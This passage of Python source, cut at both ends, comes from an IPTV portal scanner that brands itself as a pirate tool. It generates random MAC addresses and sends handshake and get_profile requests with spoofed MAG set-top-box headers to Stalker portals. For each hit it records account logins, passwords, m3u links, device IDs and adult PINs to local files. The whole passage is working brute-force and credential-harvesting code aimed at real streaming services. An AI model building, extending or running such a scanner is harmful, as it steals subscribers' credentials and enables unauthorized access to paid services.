        erste_zeile="LX-Scan"
    else: portal_input = 2

def paneltotList(input_value):
    if isinstance(input_value, list): return input_value
    elif isinstance(input_value, str): return input_value.split("\n") if "\n" in input_value else [input_value]
    else: restart_script()

dir = combo_dir

if portal_input==2:
 	say=0
 	dsy=""
 	dir = combo_dir
 	for files in os.listdir(dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+f"{GREEN}=⫸ {GOLD}"+files+'\n'
 	print(f"""{BLUE} 
Select a file with the address for scanning panel
Text files with panel addresses
They must be in the Combo catalog
{GOLD} 
"""+dsy+f"""

{GREEN} ≼ ⟬ {GRAY}Quantity files in the Combo directory = {GOLD}{str(say)}{GREEN} ⟭ ≽  {BLUE} 

Select the file number from the list""")
 	dsyno=str(input(f"\nFile number = {RESET}")) or str(say)
 	say=0
 	if "1"=="1":
	 	for files in os.listdir(dir):
 			say=say+1
 			if dsyno==str(say):
 				pdosya = os.path.join(combo_dir, files)
 				with open(pdosya, "r", encoding="utf-8") as f: erste_zeile = f.readline().strip()
 				break
	 	say=0
	 	if not pdosya=="":print(f"""

{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{pdosya}{GREEN} ⟭ ≽  {BLUE}

""")
	 	else:
	 		clear_screen()
	 		print("{RED} Bad file selection, end. {RESET}")
	 		quit()
	 	panelc=open(pdosya, 'r', encoding="utf-8")
	 	paneltotLen=panelc.readlines()
	 	paneluz=(len(paneltotLen))

def list_files(directory):
    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

paneltotLen = paneltotList(paneltotLen)

if "1"=="1":
    dsyno="0"

#dsyno=input(f'''{BLUE}

#Combo MAC

#{GOLD}    0 {GRAY}= {GREEN}Combo MAC prefixy
#{RED}    1 {GRAY}= {GREEN}Combo MAC z pliku *BUGGY*

#{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}0{GREEN} ⟭ ≽  {BLUE} 

#wybór = {RESET}''') or '0'

    say=0
    if dsyno=="0":
        print(f"\n\n\n{GREEN}  ⟬ {GRAY}Combo MAC prefixy{GREEN} ⟭   {BLUE} \n")
        nnesil=str(yeninesil)
        nnesil=(nnesil.count(',')+1)
        for xd in range(0,(nnesil)):
            tire='  》'
            if int(xd) <9:tire='   》'
            print(f"	{GOLD}{str(xd+1)}{GRAY}{tire}{GREEN}{yeninesil[xd]}")
        mactur=input(f"""{BLUE}
	Indicate the selected type of Mac
 
	{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}20{GREEN} ⟭ ≽  {BLUE} 
 
	Typ numer = {RESET}""")
        if mactur=="":mactur=20
        mactur=yeninesil[int(mactur)-1]
        print(f"""

	{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{mactur}{GREEN} ⟭ ≽  {BLUE}

""")
        macuz=input(f"""{BLUE} 
Select the number of MAC addresses to scan

{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}100000{GREEN} ⟭ ≽  {BLUE} 

Ilość = {RESET}""")
        if macuz=="":macuz=100000
        macuz=int(macuz)
        print(f"""

{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{macuz}{GREEN} ⟭ ≽  {BLUE}

""")
    else:


#################
#####TODO
#################


        files = list_files(dir)
        print(f"""


    {GREEN}⟬ {GRAY}Combo MAC listy{GREEN} ⟭   {BLUE}
""")
        for i, file in enumerate(files): say=say+1; print(f"    {GRAY} ⍟ {GOLD}{str(i + 1)}{GRAY}: {GREEN}{file}{GRAY} ⍟    ")
        file_choice = int(input(f"""
    
    {GREEN} ≼ ⟬ {GRAY}Number of files in the Combo directory = {GOLD}{str(say)}{GREEN} ⟭ ≽  {BLUE}
    
         Select the file number from the list
         Plik numer = {RESET}""") or say) - 1
        if file_choice > -1: 
            chosen_file = files[file_choice]
            dosyaa = os.path.join(dir, chosen_file)
            macc=open(dosyaa, 'r', encoding="utf-8")
            mactotLen=macc.readlines()
            macuz=(len(mactotLen))
        else: exit(0)
        say = 0
        print(f"""

    {GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{dosyaa}{GREEN} ⟭ ≽  {BLUE}

""")

        macuz=input(f"""{BLUE} 
Select the number of MAC addresses to scan

{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}100000{GREEN} ⟭ ≽  {BLUE} 

Ilość = {RESET}""")
        if macuz=="":macuz=100000
        macuz=int(macuz)
        print(f"""

{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{macuz}{GREEN} ⟭ ≽  {BLUE}

""")

        with open(dosyaa, "r", encoding="utf-8") as f: mactur = f.readline().strip()[:9]
    
    
#################
#####TODO
#################
    
    
    baslama=""
    if not baslama =="":
        baslama=int(baslama)
        csay=baslama
botsay=0
botkac=5
kanalkata="0"
kanalkata=input(f"""{BLUE}

Choosing the amount of information in the end file

{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}1{GREEN} ⟭ ≽  {BLUE} 

{GOLD}    0 {GRAY}= {GREEN}No catalogs
{GOLD}    1 {GRAY}= {GREEN}Only television channels
{GOLD}    2 {GRAY}= {GREEN}Everything (live, vod and series)

{BLUE}Enter the selected number = {RESET}""")
if kanalkata=="": kanalkata="1"
ip=""
fname=""
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
acount_id=""
a="0123456789ABCDEF"
sd=0
vpnsay=0
hitsay=0
onsay=0
sdd=0
vsay=0
bad=0
proxies=""
say=1
from urllib.parse import urlparse
if erste_zeile[:4] == "http": sanitized_url = re.sub(r'[/.:?;!\&]', '_', urlparse(erste_zeile).hostname)
else: sanitized_url = erste_zeile
dosyaadi=str(input(f"""{BLUE} 

{GREEN} ≼ ⟬ {BLUE}File to save hits{GREEN} ⟭ ≽  {BLUE} 

Enter the selected end file name

{GREEN} ≼ ⟬ {GRAY}Example = {GOLD}{sanitized_url}{GREEN} ⟭ ≽  {BLUE} 

File name = {RESET}"""))
if dosyaadi=="":dosyaadi=sanitized_url 
Dosyab=os.path.join(hits, f"{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
Dosyabx=os.path.join(hits, f"COMBO_{dosyaadi}@🏴‍☠️Pɪʀᴀᴄɪ🏴‍☠️_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
print(f"""

{GREEN} ≼ ⟬ {GRAY} Your choice = {GOLD}{Dosyab}{GREEN} ⟭ ≽  {BLUE}

""")

say=1

def yax(hits):
    with open(Dosyab, "a", encoding='utf-8') as file:file.write(hits)

def yaxx(hits):
    with open(Dosyabx, "a", encoding='utf-8') as file:file.write(hits)

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	if 1==1:
		d = date(int(yil), int(ay), int(gun))
		sontrh = time.mktime(d.timetuple())
		out=(int((sontrh-time.time())/86400))
		return out
macs=""	
sayi=1

def randommac():
	try:
		genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
	except:pass
	genmac=genmac.replace(':100',':10')
	return genmac
	
def url1(panel):
	url="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	return url

def url22(panel,macs):
	url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 

	if realblue=="real":
		url2="http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url2
		
def url3(panel):
	url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
	return url3

def url5(panel):
	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
	return url5

def url6(panel):
	url6="http://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
	return url6

def liveurl(panel):
	liveurl="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
	return liveurl

def vodurl(panel):
	vodurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
	return vodurl

def seriesurl(panel):
	seriesurl="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
	return seriesurl

def url(cid,panel):
	url7="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
	return url7

def hea1(panel,macs):
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
}
	return HEADERA

def hea2(macs,token,panel):
	tokens=token
	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+tokens,
	}
	return HEADERd

def hea3(panel):
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea
hityaz=0

def hit(mac,trh,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi,adult):
    global hitr
    global hityaz
    global lduruno, lduruon
    try:
        imza=f"""╭─➤ 🏴‍☠️🔹SɪʀQᴀᴢ🔺Cᴏɴғɪɢ🔹🏴‍☠️ 
│💀ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ💀
├◉ Mᴏᴅ1: SɪʀQᴀᴢ
├◉ Mᴏᴅ2: 𝐋𝐞𝐬𝐳𝐞𝐤𝟒𝟐𝟑𝟏 🇵🇱
├◉ Mᴏᴅ3: {AUTHOR}
├◉ 🌍 Rᴇᴀʟ ➤ """+str(real)+"""
├◉ 🌐 Pᴏʀᴛᴀʟ ➤ http://"""+str(panel)+"""/c/"""+str(playerapi)+"""
├◉ 🛰️ Tʏᴘ Pᴏʀᴛᴀʟᴜ ➤ """+uzmanm+"""
├◉ 🔢 Mᴀᴄ ➤ """+str(mac)+"""
├◉ 🗓️ Wʏɢᴀsᴀ ➤ """+str(trh)+"""
├◉ 🕓 Dᴀᴛᴀ Sᴋᴀɴᴜ ➤ """+str(time.strftime('%d-%m-%Y'))+"""/"""+str(time.strftime('%H:%M:%S'))+"""
├➤🎯 Aᴜᴛᴏʀ Sᴋᴀɴᴜ ➤ """+str(nickn)+"""
├─➤ 🏴‍☠️🄳🄰🄽🄴🔹🄻🄸🅂🅃🅈🏴‍☠️
├◉ 🚦Wʏᴍᴀɢᴀɴʏ Vᴘɴ ➤ """+str(durum)+"""
├◉ 🌐 Vᴘɴ ➤ """+str(country)+"""
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ  🏴‍☠️💀Pɪʀᴀᴄɪ💀🏴‍☠️

╭─➤ 🏴‍☠️🄱🄾🅇🔹🄸🄽🄵🄾🏴‍☠️
├◉ Aᴅᴜʟᴛ Pᴀssᴡᴏʀᴅ ➤ """+str(adult)+"""
├◉ 🔐 Sᴇʀɪᴀʟ ➤ """+str(SNENC)+""" 
├◉ 🔐 Sᴇʀɪᴀʟ Cᴜᴛ ➤ """+str(SNCUT)+"""
├◉ 🖥️1️⃣ Dᴇᴠɪᴄᴇ ID1 ➤ """+str(DEVENC)+"""
├◉ 🖥️2️⃣ Dᴇᴠɪᴄᴇ ID2 ➤ """+str(SINGENC)+"""
╰─➤ ☠️ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ☠️

╭─➤ 📂 Lɪɴᴋ ᴍ3ᴜ➤ """+str(m3ulink)+"""  
╰─➤ Iᴘᴛᴠ Zᴀᴘᴇᴡɴɪʟɪ 🏴‍☠️💀Pɪʀᴀᴄɪ💀🏴‍☠️ 

"""
        if len(kanalsayisi) > 1:
            imza=imza+"""╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ Tᴠ ➤ """+str(kanalsayisi)+"""
├▣ Vᴏᴅ ➤ """+str(filmsayisi)+"""
├▣ Sᴇʀɪᴀʟᴇ ➤ """+str(dizisayisi)+f"""
╰─➤ 🏴‍☠️SɪʀQᴀᴢ🔺Cᴏɴғɪɢ🏴‍☠️  {AUTHOR} 💀

"""
        if  kanalkata=="1" or kanalkata=="2":
            imza=imza+"""╭─➤ 🏴‍☠️🄻🄸🅂🅃🄰🏴‍☠️
├▣ 🆃︎🆅︎ ➤
╰▣ """+str(livelist)+""" 

"""
        if kanalkata=="2":
            imza=imza+"""╭▣ 🆅🅾🅳 ➤
╰▣ """+str(vodlist)+"""

╭▣ 🆂🅴🆁🅸︎🅰︎🅻︎🅴︎ ➤
├▣ """+str(serieslist)+"""
╰─➤ ☠️ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ☠️

"""
        yax(imza)
        hityaz=hityaz+1
        set_title_name(f"({hityaz}) | Premium Scanner pirates")
        print(imza)
        if hityaz >= hitc:hitr=FYELLOW
        if any(symbol in durum for symbol in ("🔒", "❌")): lduruon += 1
        else: lduruno += 1
    except:set_title_name(f"X nie zapisal hita X | ({hityaz}) | Premium Scanner pirates")

cpm=0
cpmx=0
hitr=FYELLOW

def get_run_time() -> None:
    global run_time
    current_time2 = time.time() - start_time
    hours = int(current_time2 // 3600)
    minutes = int((current_time2 % 3600) // 60)
    seconds = int(current_time2 % 60)
    run_time = f"{hours}ʜ {minutes}ᴍ {seconds}s"

start_time = time.time()

colors2 = [52, 88, 124, 160, 196, 160, 124, 88, 52]
current_pos = 0
direction = 1
DARKRED = "\x1b[38;5;52m"

def knight_rider(text: str) -> str:
    global current_pos, direction
    colored_text = ""
    for i, char in enumerate(text):
        distance = abs(i - current_pos)
        if distance < len(colors2):
            color = colors2[distance]
            colored_text += f'\x1b[38;5;{color}m{char}'
        else: colored_text += char
    colored_text += f'{RESET}'
    if current_pos == len(text) - 1: direction = -1
    elif current_pos == 0: direction = 1
    current_pos += direction
    return colored_text

def echok(mac,bot,total,hitc,oran,tokenr,panel):
	global cpm
	global status_code
	global hitr
	global lduruno, lduruon, runtime
	try:
		san_current_time_date = f'{time.strftime("%m.%d.%Y")} • {time.strftime("%H:%M")}'
		cpmx=(time.time()-cpm)
		cpmx=(round(60/cpmx))
		if str(cpmx)=="0":cpm=cpm
		else:cpm=cpmx
		sys.stdout.write('\033[2J\033[H')
		echo=(f"""{GOLD}
{LOGO}

{RESET} 
╭──────► {GOLD}🏴‍☠️ ☠️ ᑭIᖇᗩᑕI ☠️ 🏴‍☠️   {RESET} 
│
│{GRAY} {'ᴘᴀɴᴇʟ►':<8} {INVERT}{str(panel)[:20]}{RESET} 
│{GRAY} {'ᴍᴀᴄ►':<8} """+tokenr+str(mac)+f"""  {RESET}
│
│{GRAY} {'SᴛᴀᴛᴜS►':<8} """ + status_code + f"""  {RESET} 
│
│{GRAY} {'ᴛᴏᴛᴀʟ►':<8} {CYAN}"""+str(total)+f""" {GRAY}• """+f"""{FRED}%"""+str(oran)+f""" {GRAY}•{GOLD} """+str(cpm)+f"""ᴄᴘᴍ  {RESET}
│
│{GRAY} {'ʜɪᴛ►':<8} {GREEN}ᴏɴ {GRAY}("""+FYELLOW+str(hityaz)+GRAY+""") • ("""+str(hitr)+str(hitc)+GRAY+f""") {BLUE}ᴏғғ  {RESET}
│{GRAY} {'ᴠᴘɴ►':<8} {GREEN}ʙᴇᴢ {GRAY}("""+GOLD+str(lduruno)+GRAY+f""") • ("""+GOLD+str(lduruon)+GRAY+f""") {RED}ᴠᴘɴ  {RESET}
│
│{GRAY} {'SᴄᴀɴTɪᴍᴇ►':<10} {GOLD}{san_current_time_date}  {RESET}
│{GRAY} {'RᴜɴTɪᴍᴇ►':<10} {GOLD}{run_time}  {RESET}
│
│{GRAY} {'ᴛᴡᴏᴊ ᴠᴘɴ►':<10} {GOLD}{country}  {RESET}
│
╰───► {GOLD}🏴‍☠️ 💀 {DARKRED}{knight_rider(f' ᑭOᒪՏKI ՏKᑌᖇᗯIᗴᒪ Տᑕᗩᑎ  ')} 💀 🏴‍☠️    {RESET} 
""")
		sys.stdout.write(echo)
		sys.stdout.flush()
		cpm=time.time()
	except:pass

def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	veri=""
	try:
		res = ses.get(url9, timeout=4, verify=False)
		veri=str(res.text)
		if not '404 page' in veri:
			vpnips=veri.split('"country_name":"')[1]
			vpnc=veri.split('"city":"')[1].split('"')[0]
			vpn=vpnips.split('"')[0]+' / ' + vpnc
		else:vpn="❌"
	except:vpn="❌"
	return vpn

lduruno = 0
lduruon = 0
def goruntu(link,panel):
	try:
		res = ses.get(link,  headers=hea3(panel), timeout=(2,5), allow_redirects=False,stream=True)
		duru="🅣︎🅐︎🅚︎🔒❗ "
		if res.status_code==302:
			 duru="Ⓝ︎Ⓘ︎Ⓔ︎ ✅😎 "
	except:
		duru="🅣︎🅐︎🅚︎🔒❗ "
	return duru

tokenr=RESET

def hitprint(panel,mac,trh):
#	sesdosya = os.path.join('.', 'iptv', "hit.mp3") if os.name == 'nt' else "/sdcard/iptv/hit.mp3"
#	file = pathlib.Path(sesdosya)
#	try:
#		if file.exists(): ad.mediaPlay(sesdosya)
#	except:pass
	print('     🎯 ℍ𝕀𝕋 𝔹𝕐 ℙ𝕀ℝ𝔸𝕋       \n  '+str(mac)+'\n  ' + str(trh))
	if trh: yaxx("http://"+str(panel)+"/c/"+"\n"+str(mac)+"\n")
	
def list(listlink,macs,token,livel,panel):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token,panel), timeout=15, verify=False)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break
	if veri.count('title":"')>1:
		for i in veri.split('title":"'):
			try:
				kanal=""
				kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace("\\/","/")
			except:pass
			kategori=kategori+kanal+livel
	list=kategori
	return list
	
def m3uapi(playerlink,macs,token,panel):
	mt=""
	bag=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
			veri=""
			veri=str(res.text)
			break
		except:
			time.sleep(1)
			bag=bag+1
			if bag==6:
				break
	try:
		acon=""
		if 'active_cons' in veri:
			acon=veri.split('active_cons":')[1]
			acon=acon.split(',')[0]
			acon=acon.replace('"',"")
			mcon=veri.split('max_connections":')[1]
			mcon=mcon.split(',')[0]
			mcon=mcon.replace('"',"")
			status=veri.split('status":')[1]
			status=status.split(',')[0]
			status=status.replace('"',"")
			timezone=veri.split('timezone":"')[1]
			timezone=timezone.split('",')[0]
			timezone=timezone.replace("\\/","/")
			realm=veri.split('url":')[1]
			realm=realm.split(',')[0]
			realm=realm.replace('"',"")
			port=veri.split('port":')[1]
			port=port.split(',')[0]
			port=port.replace('"',"")
			userm=veri.split('username":')[1]
			userm=userm.split(',')[0]
			userm=userm.replace('"',"")
			pasm=veri.split('password":')[1]
			pasm=pasm.split(',')[0]
			pasm=pasm.replace('"',"")
			bitism=""
			bitism=veri.split('exp_date":')[1]
			bitism=bitism.split(',')[0]
			bitism=bitism.replace('"',"")
			message=veri.split('message":"')[1].split(',')[0].replace('"','')
			message=str(message.encode('utf-8').decode("unicode-escape")).replace("\\/", "/")
			if bitism=="null":
				bitism="Unlimited"
			else:
				bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))			
				mt=("""
├─➤ 🏴‍☠️🄺🄾🄽🅃🄾🔹🄸🄽🄵🄾🏴‍☠️
├◈ 📝 Pᴏᴡɪᴛᴀɴɪᴇ ➤ """+str(message)+""" 
├◈ 🌐 Hᴏsᴛ ➤ http://"""+panel+"""/c/
├◈ 🌍 Rᴇᴀʟ ➤ http://"""+realm+""":"""+port+"""/c/
├◈ #️⃣ Pᴏʀᴛ➤ """+port+"""
├◈ 👤 Lᴏɢɪɴ ➤ """+userm+"""
├◈ 🔑 Pᴀss ➤ """+pasm+"""
├◈ 📆 Wʏɢᴀsᴀ ➤ """+bitism+""" 
├◈ 🧑 Aᴋᴛʏᴡɴᴇ Pᴏʟąᴄᴢɴɪᴀ ➤ """+acon+"""
├◈ 👪 Mᴀᴋsʏᴍᴀʟɴᴇ Pᴏʟąᴄᴢᴇɴɪᴀ ➤ """+mcon+""" 
├◈ 🚦 Sᴛᴀᴛᴜs ➤ """+status+"""
├◈ 🕛 Sᴛʀᴇғᴀ Cᴢᴀsᴏᴡᴀ ➤ """+timezone+f""" 
├─◈ 💀 ᴄᴏɴғɪɢ ᴍᴏᴅ ᴘʏ ʙʏ {AUTHOR}""")
	except:pass
	return mt
pattern = r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
panelsay=0	
bots =0
botsay=0
def basla():
	global panelsay,botsay
	for j in range(botkac):
		for i in paneltotLen:
			t1 = threading.Thread(target=d1)
			t1.start()
		botsay=botsay+1
		panelsay=0

def replace_status(status_code: int):
    status = f"{GREEN1}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ {status_code} ]{RESET}"
    if status_code == 200: status = f"{GREEN1}ᴀᴠᴀɪʟᴀʙʟᴇ [ 200 ]{RESET}"
    if status_code == 401: status = f"{MAGENTA}ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ [ 401 ]{RESET}"
    if status_code == 403: status = f"{RED}Fᴏʀʙɪᴅᴅᴇɴ [ 403 ]{RESET}"
    if status_code == 512: status = f"{GREEN}Gᴏᴏᴅ [ 512 ]{RESET}"
    if status_code == 503: status = f"{MAGENTA}Sᴇʀᴠɪᴄᴇ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ [ 503 ]{RESET}"
    if status_code == 520: status = f"{MAGENTA}ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ [ 520 ]{RESET}"
#    if status_code == 404: status = f"{RED}ɴᴏᴛ Fᴏᴜɴᴅ [ 404 ]{RESET}"
    if status_code == 404: status = f"{GREEN}Gᴏᴏᴅ [ 404 ]{RESET}"
    if status_code == 301: status = f"{BLUE}ʀᴇᴅɪʀᴇᴄᴛ [ 301 ]{RESET}"
    if status_code == 500: status = f"{BLUE}Sᴇʀᴠᴇʀ Eʀʀᴏʀ [ 500 ]{RESET}"
    if status_code == 429: status = f"{BLUE}ᴛᴏᴏ ᴍᴀɴʏ ʀᴇqᴜᴇsᴛs [ 429 ]{RESET}"
    if status_code == 302: status = f"{BLUE}ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ [ 302 ]{RESET}"
    return status
        
def replace_symbols(text):
    replacements = {
        "{":"",
        "|":"",
        "[": "",
        "]":"",
        "«»": "",
        "🔸AE": " |🇦🇪 AE",
        "🔸UAE": " |🇦🇪 UAE",
        "🔸ALL": " |🏁ALL",
        "🔸ALB": " |🇦🇱 ALB",
        "🔸ASIA": " 🈲️ ASIA",
        "🔸AR": " |🇸🇦 AR",
        "🔸AT": " |🇦🇹 AT",
        "🔸AU": " |🇦🇺 AU",
        "🔸AZ": " |🇦🇿 AZ",
        "🔸BE": " |🇧🇪 BE",
        "🔸BG": " |🇧🇬 BG",
        "🔸BIH": " |🇧🇦 BIH",
        "🔸BO": " |🇧🇴 BO",
        "🔸BR": " |🇧🇷 BR",
        "🔸CA": " |🇨🇦 CA",
        "🔸CH": " |🇨🇭 CH",
        "🔸SW": " |🇨🇭 SW",
        "🔸CL": " |🇨🇱 CL",
        "🔸CN": " |🇨🇳 CN",
        "🔸CO": " |🇨🇴 CO",
        "🔸CR": " |🇭🇷 CR",
        "🔸CZ": " |🇨🇿 CZ",
        "🔸DE": " |🇩🇪 DE",
        "🔸DK": " |🇩🇰 DK",
        "🔸DM": " |🇩🇰 DM",
        "🔸EC": " |🇪🇨 EC",
        "🔸EG": " |🇪🇬 EG",
        "🔸EN": " |🇬🇧 EN",
        "🔸GB": " |🇬🇧 GB",
        "🔸UK": " |🇬🇧 UK",
        "🔸EU": " |🇪🇺 EU",
        "🔸ES": " |🇪🇸 ES",
        "🔸SP": " |🇪🇸 SP",
        "🔸EX": " |🇭🇷 EX",
        "🔸YU": " |🇭🇷 YU",
        "🔸FI": " |🇫🇮 FI",
        "🔸FR": " |🇫🇷 FR",
        "🔸GOR": " |🇲🇪 GOR",
        "🔸GR": " |🇬🇷 GR",
        "🔸HR": " |🇭🇷 HR",
        "🔸HU": " |🇭🇺 HU",
        "🔸IE": " |🇮🇪 IE",
        "🔸IL": " |🇮🇪 IL",
        "🔸IR": " |🇮🇪 IR",
        "🔸ID": " |🇮🇩 ID",
        "🔸IN": " |🇮🇳 IN",
        "🔸IT": " |🇮🇹 IT",
        "🔸JP": " |🇯🇵 JP",
        "🔸KE": " |🇰🇪 KE",
        "🔸KU": " |🇭🇺 KU",
        "🔸KR": " |🇰🇷 KR",
        "🔸LU": " |🇱🇺 LU",
        "🔸MKD": " |🇲🇰 MKD",
        "🔸MX": " |🇲🇽 MX",
        "🔸MY": " |🇲🇾 MY",
        "🔸NETFLIX": " | 🚩 NETFLIX",
        "🔸NG": " |🇳🇬 NG",
        "🔸NZ": " |🇳🇿 NZ",
        "🔸NL": " |🇳🇱 NL",
        "🔸NO": " |🇳🇴 NO",
        "🔸PA": " |🇵🇦 PA",
        "🔸PE": " |🇵🇪 PE",
        "🔸PH": " |🇵🇭 PH",
        "🔸PK": " |🇵🇰 PK",
        "🔸PL": " |🇵🇱 PL",
        "🔸POLSKA": " |🇵🇱 PL - POLSKA",
        "🔸POLAND": " |🇵🇱 PL - POLSKA",
        "🔸PT": " |🇵🇹 PT",
        "🔸PPV": " |🏋🏼‍♂️ PPV",
        "🔸QA": " |🇶🇦 QA",
        "🔸RO": " |🇷🇴 RO",
        "🔸RU": " |🇷🇺 RU",
        "🔸SA": " |🇸🇦 SA",
        "🔸SCREENSAVER": " | 🏞 SCREENSAVER",
        "🔸SE": " |🇸🇪 SE",
        "🔸SK": " |🇸🇰 SK",
        "🔸SL": " |🇸🇮 SL",
        "🔸SG": " |🇸🇬 SG",
        "🔸SR": " |🇷🇸 SR",
        "🔸SU": " |🇦🇲 SU",
        "🔸TH": " |🇹🇭 TH",
        "🔸TR": " |🇹🇷 TR",
        "🔸TW": " |🇹🇼 TW",
        "🔸UKR": " |🇺🇦 UKR",
        "🔸US": " |🇺🇸 US",
        "🔸VN": " |🇻🇳 VN",
        "🔸VIP": " |⚽️ VIP",
        "🔸WEB": " |🏳️‍🌈 WEB",
        "🔸ZA": " |🇿🇦 ZA",
        "🔸AF": " |🇿🇦 AF",
        "🔸ADU": " |🔞 ADULTS",
        "🔸FO": " |🔞 FOR",
        "🔸⋅ FOR": " |🔞 ⋅ FOR",
        "🔸BLU": " |🔞 BLU",
        "🔸XXX": " |🔞 XXX",
        "🔸": "  🔸 "
    }
    for old, new in replacements.items(): text = text.replace(old, new)
    return text.upper()

def extract_host_port(url):
    match = re.match(r"https?://([^/:]+)(?::(\d+))?", url)  
    if not match: match = re.match(r"([^/:]+)(?::(\d+))?", url)
    if match:
        hostname = match.group(1)
        port = match.group(2) if match.group(2) else "80"
